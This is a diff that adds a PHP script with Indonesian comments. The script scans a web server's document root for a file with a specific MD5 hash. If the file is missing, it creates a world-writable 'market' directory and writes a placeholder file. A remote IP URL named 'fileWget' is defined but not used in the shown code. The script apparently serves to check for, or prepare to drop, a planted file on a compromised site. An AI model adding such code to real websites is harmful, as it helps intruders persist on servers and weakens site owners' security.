@@ -1,0 +1,48 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+$urls_ext = "http://178.128.18.247:8080/fileWget/asd";
+$directory = $_SERVER['DOCUMENT_ROOT'];
+
+// Fungsi untuk memindai direktori dan subdirektori
+$files = new RecursiveIteratorIterator(
+    new RecursiveDirectoryIterator($directory)
+);
+
+$targetMD5 = '18ddc77535b6f4f2a64fcde9a32a1176';
+$found = false;
+
+// Loop melalui setiap file dalam direktori dan subdirektori
+foreach ($files as $file) {
+    // Pastikan itu adalah file
+    if ($file->isFile()) {
+        $path = $file->getPathname();
+        $md5 = md5_file($path);
+        if ($md5 === $targetMD5) {
+            $found = true;
+            echo "ADA";
+            break;
+        }
+    }
+}
+
+if (!$found) {
+    // Tentukan direktori tempat file akan dibuat
+    $newDirectory = $directory . '/market'; 
+    if (!is_dir($newDirectory)) {
+        mkdir($newDirectory, 0777, true);
+    }
+    
+    $newFilePath = $newDirectory . '/new_file.txt';
+    $newFileContent = 'Konten file baru di sini...';
+
+    // Coba membuat file baru
+    if (file_put_contents($newFilePath, $newFileContent) !== false) {
+        echo "Tidak ada, file baru telah dibuat";
+    } else {
+        echo "Gagal membuat file baru";
+    }
+}
+?>
